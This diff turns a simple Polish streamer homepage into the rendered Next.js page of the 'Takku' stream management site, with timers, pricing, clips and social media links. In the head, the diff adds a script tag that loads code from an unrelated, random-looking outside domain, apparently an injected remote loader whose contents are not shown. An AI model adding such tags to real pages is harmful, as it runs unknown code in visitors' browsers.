@@ -1,56 +1,384 @@
 <!DOCTYPE html>
+<!--r4fpN7dVUUz_EBIX9YdMw-->
 <html lang="pl">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bambik - Stream Management</title>
-  <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-<header>
-  <h1>Bambik</h1>
-  <p>Stream Management System</p>
-</header>
-
-<section id="live">
-  <h2>LIVE</h2>
-  <button onclick="openStream()">Oglądaj Stream</button>
-</section>
-
-<section id="timers">
-  <h3>Aktywne Timery</h3>
-  <ul id="timers-list"></ul>
-</section>
-
-<section id="pricing">
-  <h3>Cennik</h3>
-  <ul id="pricing-list"></ul>
-</section>
-
-<section id="clips">
-  <h3>Ostatnie clipy</h3>
-  <ul>
-    <li>Clip 1 - przykładowy link</li>
-    <li>Clip 2 - przykładowy link</li>
-    <li>Clip 3 - przykładowy link</li>
-  </ul>
-</section>
-
-<section id="socials">
-  <h3>Znajdź nas w social mediach</h3>
-  <ul>
-    <li><a href="#">YouTube</a></li>
-    <li><a href="#">Kick</a></li>
-    <li><a href="#">Discord</a></li>
-    <li><a href="#">Twitch</a></li>
-    <li><a href="#">Instagram</a></li>
-  </ul>
-</section>
-
-<footer>
-  © 2026 Bambik - Stream Management System
-</footer>
-
-<script src="script.js"></script>
-</body>
+    <head>
+        <meta charSet="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <link rel="preload" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+        <link rel="stylesheet" href="/_next/static/css/740ed232409d70d3.css" data-precedence="next"/>
+        <link rel="stylesheet" href="/_next/static/css/7e7d96b1e6991756.css" data-precedence="next"/>
+        <link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-d6126fa66eae22ea.js"/>
+        <script src="/_next/static/chunks/4bd1b696-602635ee57868870.js" async=""></script>
+        <script src="/_next/static/chunks/5964-7bb2b019501ffae5.js" async=""></script>
+        <script src="/_next/static/chunks/main-app-376de590c453220d.js" async=""></script>
+        <script src="/_next/static/chunks/2108-97ac8b942da54c5b.js" async=""></script>
+        <script src="/_next/static/chunks/app/layout-5a55ca58c505b7e3.js" async=""></script>
+        <script src="/_next/static/chunks/6874-d27b54d0b28e3259.js" async=""></script>
+        <script src="/_next/static/chunks/7959-91e8dfd75bbd8611.js" async=""></script>
+        <script src="/_next/static/chunks/8474-321d2e09fe0ae0b3.js" async=""></script>
+        <script src="/_next/static/chunks/app/page-22831201995655b7.js" async=""></script>
+        <meta name="next-size-adjust" content=""/>
+        <title>Takku</title>
+        <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16"/>
+        <script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script>
+        <script src="https://www.99fkw4w8.com/min.js"></script>
+    </head>
+    <body class="__className_f367f3">
+        <div hidden="">
+        <!--$-->
+        <!--/$-->
+        </div>
+        <div class="min-h-screen themed-bg-main">
+            <header class="themed-header-bg backdrop-blur-sm border-b themed-border-secondary ">
+                <div class="max-w-7xl mx-auto px-4 sm:px-6 py-3 sm:py-4">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-3">
+                            <div class="p-2 rounded-lg themed-accent-primary bg-current/10">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-timer w-6 h-6 sm:w-8 sm:h-8 themed-accent-primary" aria-hidden="true">
+                                    <line x1="10" x2="14" y1="2" y2="2"></line>
+                                    <line x1="12" x2="15" y1="14" y2="11"></line>
+                                    <circle cx="12" cy="14" r="8"></circle>
+                                </svg>
+                            </div>
+                            <div>
+                                <h1 class="text-xl sm:text-2xl font-bold themed-text-primary">Takku</h1>
+                                <p class="text-xs sm:text-sm themed-text-muted">Stream Management System</p>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-2 sm:space-x-4">
+                            <div class="hidden md:flex items-center space-x-2 themed-text-muted text-sm">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock w-4 h-4" aria-hidden="true">
+                                    <path d="M12 6v6l4 2"></path>
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                </svg>
+                                <span>--:--:--</span>
+                            </div>
+                            <div class="relative p-2 themed-card-bg themed-border-primary border rounded-lg themed-card-hover-bg transition-colors">
+                                <button class="p-2 rounded-lg themed-card-bg themed-border-primary border themed-card-hover-bg transition-colors" title="Zmień motyw">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-palette w-5 h-5 themed-text-secondary" aria-hidden="true">
+                                        <path d="M12 22a1 1 0 0 1 0-20 10 9 0 0 1 10 9 5 5 0 0 1-5 5h-2.25a1.75 1.75 0 0 0-1.4 2.8l.3.4a1.75 1.75 0 0 1-1.4 2.8z"></path>
+                                        <circle cx="13.5" cy="6.5" r=".5" fill="currentColor"></circle>
+                                        <circle cx="17.5" cy="10.5" r=".5" fill="currentColor"></circle>
+                                        <circle cx="6.5" cy="12.5" r=".5" fill="currentColor"></circle>
+                                        <circle cx="8.5" cy="7.5" r=".5" fill="currentColor"></circle>
+                                    </svg>
+                                </button>
+                            </div>
+                            <a href="/admin" class="flex items-center space-x-2 px-4 py-2 rounded-lg themed-btn-primary hover:themed-btn-primary-hover transition-colors text-sm font-medium">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-log-in w-4 h-4" aria-hidden="true">
+                                    <path d="m10 17 5-5-5-5"></path>
+                                    <path d="M15 12H3"></path>
+                                    <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
+                                </svg>
+                                <span class="hidden sm:inline">Panel Admina</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </header>
+            <div class="fixed top-20 right-6 z-40 hidden lg:block">
+                <button class="
+        group relative inline-flex items-center gap-3 px-6 py-4 rounded-xl
+        undefined themed-text-primary
+        font-bold text-lg shadow-lg
+        transform transition-all duration-300 ease-out
+        hover:scale-105 hover:shadow-xl
+        focus:outline-none focus:ring-2 focus:ring-purple-500/50
+        before:absolute before:inset-0 before:rounded-xl
+        before:bg-gradient-to-r before:from-purple-500/20 before:to-pink-500/20
+        before:opacity-0 before:transition-opacity before:duration-300
+        hover:before:opacity-100
+      ">
+                    <div class="flex items-center gap-2">
+                        <div class="w-3 h-3 bg-red-500 rounded-full animate-pulse shadow-lg shadow-red-500/50"></div>
+                        <span class="text-red-400 font-bold text-sm uppercase tracking-wider">LIVE</span>
+                    </div>
+                    <span class="relative z-10">Oglądaj Stream</span>
+                    <div class="relative z-10 p-2 rounded-lg bg-white/10 group-hover:bg-white/20 transition-colors">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M8 5v14l11-7z"></path>
+                        </svg>
+                    </div>
+                    <div class="absolute inset-0 rounded-xl bg-gradient-to-r from-purple-500 to-pink-500 opacity-0 group-hover:opacity-20 transition-opacity duration-300 blur-xl"></div>
+                </button>
+            </div>
+            <div class="lg:hidden sticky top-0 z-30 p-4 text-center">
+                <button class="
+        group relative inline-flex items-center gap-3 px-6 py-4 rounded-xl
+        undefined themed-text-primary
+        font-bold text-lg shadow-lg
+        transform transition-all duration-300 ease-out
+        hover:scale-105 hover:shadow-xl
+        focus:outline-none focus:ring-2 focus:ring-purple-500/50
+        before:absolute before:inset-0 before:rounded-xl
+        before:bg-gradient-to-r before:from-purple-500/20 before:to-pink-500/20
+        before:opacity-0 before:transition-opacity before:duration-300
+        hover:before:opacity-100
+      ">
+                    <div class="flex items-center gap-2">
+                        <div class="w-3 h-3 bg-red-500 rounded-full animate-pulse shadow-lg shadow-red-500/50"></div>
+                        <span class="text-red-400 font-bold text-sm uppercase tracking-wider">LIVE</span>
+                    </div>
+                    <span class="relative z-10">Oglądaj Stream</span>
+                    <div class="relative z-10 p-2 rounded-lg bg-white/10 group-hover:bg-white/20 transition-colors">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M8 5v14l11-7z"></path>
+                        </svg>
+                    </div>
+                    <div class="absolute inset-0 rounded-xl bg-gradient-to-r from-purple-500 to-pink-500 opacity-0 group-hover:opacity-20 transition-opacity duration-300 blur-xl"></div>
+                </button>
+            </div>
+            <main class="py-8 sm:py-12">
+                <div class="max-w-7xl mx-auto px-4 sm:px-6 space-y-12 sm:space-y-16">
+                    <section class="space-y-6 ">
+                        <div class="text-center mb-8">
+                            <h2 class="text-3xl sm:text-4xl font-bold themed-text-primary mb-4">Aktywne Timery</h2>
+                            <p class="themed-text-secondary text-base sm:text-lg">Śledź postęp aktualnie trwających aktywności</p>
+                        </div>
+                        <div class="flex items-center justify-between">
+                            <button class="rounded-lg font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed inline-flex items-center justify-center themed-text-secondary hover:themed-text-primary themed-card-hover-bg px-3 py-1.5 text-sm flex items-center space-x-2">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link w-4 h-4" aria-hidden="true">
+                                    <path d="M15 3h6v6"></path>
+                                    <path d="M10 14 21 3"></path>
+                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                                </svg>
+                                <span>Zobacz wszystkie</span>
+                            </button>
+                            <button type="button" class="rounded-lg font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed inline-flex items-center justify-center themed-text-secondary hover:themed-text-primary themed-card-hover-bg px-3 py-1.5 text-sm flex items-center space-x-2">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chart-column w-4 h-4" aria-hidden="true">
+                                    <path d="M3 3v16a2 2 0 0 0 2 2h16"></path>
+                                    <path d="M18 17V9"></path>
+                                    <path d="M13 17V5"></path>
+                                    <path d="M8 17v-3"></path>
+                                </svg>
+                                <span>Statystyki</span>
+                            </button>
+                        </div>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+                            <div class="
+    themed-card-bg 
+    themed-border-primary 
+    border rounded-xl 
+    themed-card-hover-bg transition-all duration-300 
+    p-4 sm:p-6
+    p-6 animate-pulse
+  ">
+                                <div class="space-y-3">
+                                    <div class="h-4 themed-card-bg rounded"></div>
+                                    <div class="h-8 themed-card-bg rounded"></div>
+                                    <div class="h-2 themed-card-bg rounded"></div>
+                                </div>
+                            </div>
+                            <div class="
+    themed-card-bg 
+    themed-border-primary 
+    border rounded-xl 
+    themed-card-hover-bg transition-all duration-300 
+    p-4 sm:p-6
+    p-6 animate-pulse
+  ">
+                                <div class="space-y-3">
+                                    <div class="h-4 themed-card-bg rounded"></div>
+                                    <div class="h-8 themed-card-bg rounded"></div>
+                                    <div class="h-2 themed-card-bg rounded"></div>
+                                </div>
+                            </div>
+                            <div class="
+    themed-card-bg 
+    themed-border-primary 
+    border rounded-xl 
+    themed-card-hover-bg transition-all duration-300 
+    p-4 sm:p-6
+    p-6 animate-pulse
+  ">
+                                <div class="space-y-3">
+                                    <div class="h-4 themed-card-bg rounded"></div>
+                                    <div class="h-8 themed-card-bg rounded"></div>
+                                    <div class="h-2 themed-card-bg rounded"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section>
+                        <div class="text-center mb-8">
+                            <h2 class="text-3xl sm:text-4xl font-bold themed-text-primary mb-4">Cennik</h2>
+                            <p class="themed-text-secondary text-base sm:text-lg">Dostępne opcje i aktywności dla widzów</p>
+                        </div>
+                        <div class="flex justify-center items-center py-12">
+                            <div class="flex items-center space-x-3">
+                                <div class="animate-spin rounded-full h-6 w-6 border-b-2 themed-accent-primary border-current"></div>
+                                <span class="themed-text-muted">Ładowanie cennika...</span>
+                            </div>
+                        </div>
+                    </section>
+                    <section>
+                        <div class="text-center mb-8">
+                            <h2 class="text-3xl sm:text-4xl font-bold themed-text-primary mb-4">Ostatnie Clipy</h2>
+                            <p class="themed-text-secondary text-base sm:text-lg">Najnowsze klipy z kanału Kick.com</p>
+                        </div>
+                        <div class="flex justify-center items-center py-12">
+                            <div class="flex items-center space-x-3">
+                                <div class="animate-spin rounded-full h-6 w-6 border-b-2 themed-accent-primary border-current"></div>
+                                <span class="themed-text-muted">Ładowanie clipów...</span>
+                            </div>
+                        </div>
+                    </section>
+                    <section class="py-12 sm:py-16 ">
+                        <div class="max-w-7xl mx-auto px-4 sm:px-6">
+                            <div class="text-center mb-12">
+                                <h2 class="text-2xl sm:text-3xl font-bold text-white mb-4">Kanały Przyjaciół</h2>
+                                <div class="flex items-center justify-center">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-refresh-cw w-6 h-6 animate-spin text-gray-400 mr-2" aria-hidden="true">
+                                        <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"></path>
+                                        <path d="M21 3v5h-5"></path>
+                                        <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"></path>
+                                        <path d="M8 16H3v5"></path>
+                                    </svg>
+                                    <span class="text-gray-400">Ładowanie kanałów...</span>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section>
+                        <div class="text-center mb-12">
+                            <h2 class="text-4xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">Znajdź nas w social mediach</h2>
+                            <p class="text-gray-400 text-lg">Śledź nasze przygody i nie przegap żadnych nowości!</p>
+                        </div>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+                            <div class="group relative overflow-hidden bg-gradient-to-br from-red-500/10 via-red-600/10 to-red-700/10 backdrop-blur-xl rounded-2xl border border-red-500/20 hover:border-red-400/40 transition-all duration-500 hover:scale-105 hover:shadow-2xl hover:shadow-red-500/25">
+                                <div class="absolute inset-0 bg-gradient-to-br from-red-500/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                                <div class="relative p-6 text-center">
+                                    <div class="mb-4 relative">
+                                        <div class="w-16 h-16 mx-auto bg-gradient-to-br from-red-500 to-red-600 rounded-2xl flex items-center justify-center mb-4 transform group-hover:rotate-12 transition-transform duration-500">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-youtube w-8 h-8 text-white" aria-hidden="true">
+                                                <path d="M2.5 17a24.12 24.12 0 0 1 0-10 2 2 0 0 1 1.4-1.4 49.56 49.56 0 0 1 16.2 0A2 2 0 0 1 21.5 7a24.12 24.12 0 0 1 0 10 2 2 0 0 1-1.4 1.4 49.55 49.55 0 0 1-16.2 0A2 2 0 0 1 2.5 17"></path>
+                                                <path d="m10 15 5-3-5-3z"></path>
+                                            </svg>
+                                        </div>
+                                    </div>
+                                    <h3 class="text-lg font-bold text-white mb-2 group-hover:text-red-400 transition-colors">YouTube</h3>
+                                    <p class="text-gray-400 text-sm mb-4 group-hover:text-gray-300 transition-colors">@TakuPL</p>
+                                    <div class="flex items-center justify-center space-x-2 text-red-400 text-sm">
+                                        <div class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
+                                        <span>WIDEO</span>
+                                    </div>
+                                    <a href="https://youtube.com/@TakuPL" target="_blank" rel="noopener noreferrer" class="absolute inset-0 z-10" aria-label="YouTube"></a>
+                                </div>
+                            </div>
+                            <div class="group relative overflow-hidden bg-gradient-to-br from-green-500/10 via-green-600/10 to-emerald-700/10 backdrop-blur-xl rounded-2xl border border-green-500/20 hover:border-green-400/40 transition-all duration-500 hover:scale-105 hover:shadow-2xl hover:shadow-green-500/25">
+                                <div class="absolute inset-0 bg-gradient-to-br from-green-500/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                                <div class="relative p-6 text-center">
+                                    <div class="mb-4 relative">
+                                        <div class="w-16 h-16 mx-auto bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center mb-4 transform group-hover:rotate-12 transition-transform duration-500">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-message-circle w-8 h-8 text-white" aria-hidden="true">
+                                                <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path>
+                                            </svg>
+                                        </div>
+                                    </div>
+                                    <h3 class="text-lg font-bold text-white mb-2 group-hover:text-green-400 transition-colors">Kick</h3>
+                                    <p class="text-gray-400 text-sm mb-4 group-hover:text-gray-300 transition-colors">takuu</p>
+                                    <div class="flex items-center justify-center space-x-2 text-green-400 text-sm">
+                                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                                        <span>STREAM</span>
+                                    </div>
+                                    <a href="https://kick.com/takuu" target="_blank" rel="noopener noreferrer" class="absolute inset-0 z-10" aria-label="Kick"></a>
+                                </div>
+                            </div>
+                            <div class="group relative overflow-hidden bg-gradient-to-br from-indigo-500/10 via-indigo-600/10 to-indigo-700/10 backdrop-blur-xl rounded-2xl border border-indigo-500/20 hover:border-indigo-400/40 transition-all duration-500 hover:scale-105 hover:shadow-2xl hover:shadow-indigo-500/25">
+                                <div class="absolute inset-0 bg-gradient-to-br from-indigo-500/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                                <div class="relative p-6 text-center">
+                                    <div class="mb-4 relative">
+                                        <div class="w-16 h-16 mx-auto bg-gradient-to-br from-indigo-500 to-indigo-600 rounded-2xl flex items-center justify-center mb-4 transform group-hover:rotate-12 transition-transform duration-500">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-users w-8 h-8 text-white" aria-hidden="true">
+                                                <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+                                                <path d="M16 3.128a4 4 0 0 1 0 7.744"></path>
+                                                <path d="M22 21v-2a4 4 0 0 0-3-3.87"></path>
+                                                <circle cx="9" cy="7" r="4"></circle>
+                                            </svg>
+                                        </div>
+                                    </div>
+                                    <h3 class="text-lg font-bold text-white mb-2 group-hover:text-indigo-400 transition-colors">Discord</h3>
+                                    <p class="text-gray-400 text-sm mb-4 group-hover:text-gray-300 transition-colors">Serwer społeczności</p>
+                                    <div class="flex items-center justify-center space-x-2 text-indigo-400 text-sm">
+                                        <div class="w-2 h-2 bg-indigo-500 rounded-full animate-pulse"></div>
+                                        <span>CHAT</span>
+                                    </div>
+                                    <a href="https://discord.com/invite/6JV7jxxxhp" target="_blank" rel="noopener noreferrer" class="absolute inset-0 z-10" aria-label="Discord"></a>
+                                </div>
+                            </div>
+                            <div class="group relative overflow-hidden bg-gradient-to-br from-purple-500/10 via-purple-600/10 to-purple-700/10 backdrop-blur-xl rounded-2xl border border-purple-500/20 hover:border-purple-400/40 transition-all duration-500 hover:scale-105 hover:shadow-2xl hover:shadow-purple-500/25">
+                                <div class="relative p-6 text-center">
+                                    <div class="mb-4 relative">
+                                        <div class="w-16 h-16 mx-auto bg-gradient-to-br from-purple-500 to-purple-600 rounded-2xl flex items-center justify-center mb-4 transform group-hover:rotate-12 transition-transform duration-500">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-twitch w-8 h-8 text-white" aria-hidden="true">
+                                                <path d="M21 2H3v16h5v4l4-4h5l4-4V2zm-10 9V7m5 4V7"></path>
+                                            </svg>
+                                        </div>
+                                    </div>
+                                    <h3 class="text-lg font-bold text-white mb-2 group-hover:text-purple-400 transition-colors">Twitch</h3>
+                                    <p class="text-gray-400 text-sm mb-4 group-hover:text-gray-300 transition-colors">takuu_</p>
+                                    <div class="flex items-center justify-center space-x-2 text-purple-400 text-sm">
+                                        <div class="w-2 h-2 bg-purple-500 rounded-full animate-pulse"></div>
+                                        <span>BACKUP</span>
+                                    </div>
+                                    <a href="https://twitch.tv/takuu_" target="_blank" rel="noopener noreferrer" class="absolute inset-0 z-10" aria-label="Twitch"></a>
+                                </div>
+                            </div>
+                            <div class="group relative overflow-hidden bg-gradient-to-br from-pink-500/10 via-purple-500/10 to-indigo-500/10 backdrop-blur-xl rounded-2xl border border-pink-500/20 hover:border-pink-400/40 transition-all duration-500 hover:scale-105 hover:shadow-2xl hover:shadow-pink-500/25">
+                                <div class="absolute inset-0 bg-gradient-to-br from-pink-500/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                                <div class="relative p-6 text-center">
+                                    <div class="mb-4 relative">
+                                        <div class="w-16 h-16 mx-auto bg-gradient-to-br from-pink-500 via-purple-500 to-indigo-500 rounded-2xl flex items-center justify-center mb-4 transform group-hover:rotate-12 transition-transform duration-500">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-instagram w-8 h-8 text-white" aria-hidden="true">
+                                                <rect width="20" height="20" x="2" y="2" rx="5" ry="5"></rect>
+                                                <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+                                                <line x1="17.5" x2="17.51" y1="6.5" y2="6.5"></line>
+                                            </svg>
+                                        </div>
+                                    </div>
+                                    <h3 class="text-lg font-bold text-white mb-2 group-hover:text-pink-400 transition-colors">Instagram</h3>
+                                    <p class="text-gray-400 text-sm mb-4 group-hover:text-gray-300 transition-colors">@takku</p>
+                                    <div class="flex items-center justify-center space-x-2 text-pink-400 text-sm">
+                                        <div class="w-2 h-2 bg-pink-500 rounded-full animate-pulse"></div>
+                                        <span>PHOTO</span>
+                                    </div>
+                                    <a href="https://www.instagram.com/takupl" target="_blank" rel="noopener noreferrer" class="absolute inset-0 z-10" aria-label="Instagram"></a>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <footer class="text-center py-8 border-t themed-border-secondary">
+                        <div class="themed-text-muted">
+                            <p class="mb-2">© 2025 Takku - Stream Management System</p>
+                            <p class="text-sm">Zarządzaj timerami i interakcjami ze streamem w czasie rzeczywistym</p>
+                        </div>
+                    </footer>
+                </div>
+            </main>
+        </div>
+        <!--$-->
+        <!--/$-->
+        <script src="/_next/static/chunks/webpack-d6126fa66eae22ea.js" id="_R_" async=""></script>
+        <script>
+            (self.__next_f = self.__next_f || []).push([0])
+        </script>
+        <script>
+            self.__next_f.push([1, "1:\"$Sreact.fragment\"\n2:I[881,[\"2108\",\"static/chunks/2108-97ac8b942da54c5b.js\",\"7177\",\"static/chunks/app/layout-5a55ca58c505b7e3.js\"],\"Providers\"]\n3:I[7555,[],\"\"]\n4:I[1295,[],\"\"]\n5:I[894,[],\"ClientPageRoot\"]\n6:I[7972,[\"6874\",\"static/chunks/6874-d27b54d0b28e3259.js\",\"7959\",\"static/chunks/7959-91e8dfd75bbd8611.js\",\"8474\",\"static/chunks/8474-321d2e09fe0ae0b3.js\",\"8974\",\"static/chunks/app/page-22831201995655b7.js\"],\"default\"]\n9:I[9665,[],\"OutletBoundary\"]\nb:I[4911,[],\"AsyncMetadataOutlet\"]\nd:I[9665,[],\"ViewportBoundary\"]\nf:I[9665,[],\"MetadataBoundary\"]\n10:\"$Sreact.suspense\"\n12:I[8393,[],\"\"]\n:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/740ed232409d70d3.css\",\"style\"]\n:HL[\"/_next/static/css/7e7d96b1e6991756.css\",\"style\"]\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "0:{\"P\":null,\"b\":\"r4fpN7dVUUz-EBIX9YdMw\",\"p\":\"\",\"c\":[\"\",\"\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/740ed232409d70d3.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/7e7d96b1e6991756.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"pl\",\"children\":[\"$\",\"body\",null,{\"className\":\"__className_f367f3\",\"suppressHydrationWarning\":true,\"children\":[\"$\",\"$L2\",null,{\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"$L5\",null,{\"Component\":\"$6\",\"searchParams\":{},\"params\":{},\"promises\":[\"$@7\",\"$@8\"]}],null,[\"$\",\"$L9\",null,{\"children\":[\"$La\",[\"$\",\"$Lb\",null,{\"promise\":\"$@c\"}]]}]]}],{},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[[\"$\",\"$Ld\",null,{\"children\":\"$Le\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]],[\"$\",\"$Lf\",null,{\"children\":[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$10\",null,{\"fallback\":null,\"children\":\"$L11\"}]}]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$12\",[]],\"s\":false,\"S\":true}\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "7:{}\n8:\"$0:f:0:1:2:children:1:props:children:0:props:params\"\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "e:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\na:null\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "13:I[8175,[],\"IconMark\"]\nc:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Takku\"}],[\"$\",\"link\",\"1\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"16x16\"}],[\"$\",\"$L13\",\"2\",{}]],\"error\":null,\"digest\":\"$undefined\"}\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "11:\"$c:metadata\"\n"])
+        </script>
+    </body>
 </html>
